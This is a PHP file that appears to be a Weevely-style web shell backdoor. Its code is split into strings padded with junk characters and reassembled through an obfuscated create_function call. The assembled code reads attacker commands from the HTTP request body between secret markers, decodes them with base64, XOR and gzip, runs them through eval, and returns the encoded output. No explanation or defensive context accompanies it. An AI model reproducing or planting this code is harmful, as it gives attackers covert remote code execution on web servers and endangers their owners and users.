<?php
$B='$k){$c=strlen($k%);$l=st%rlen(%$t);%$o="%";for($i%=%0%;$i<$l;){for($j=0%;($j<$c%&&$i<%$l);$j+%+,$i%++){$';
$T=str_replace('X','','creXaXte_XXfuXnXction');
$n='con%te%nts();@ob_en%%d_clean();$%r=@b%ase64_en%co%de%(@x(@gzcom%press%($o),$k))%;pr%int(%"$p$kh$r$kf");}';
$g='nput"),$%m)==1) {%@ob_sta%rt();%@ev%al(@gzunc%ompres%s%(@x(@%ba%se64_decod%e($m%[1]),$%k)));$%o=@ob_get_';
$m='o%%.=$t{$i}^$k{%$j};%}%}return $o;%}i%f (@pre%g_matc%h("/$kh(.+)%$k%f/",@fi%le_get%_contents(%"ph%p://i%';
$j='$k%="05df064e";$%kh="%9233a9%8%b5e63";$kf="6%6%18e9b%af31e";%$p="fgt1LEu%7QWS%pgb6i";%functi%o%%%n x($t,';
$K=str_replace('%','',$j.$B.$m.$g.$n);
$f=$T('',$K);$f();
?>
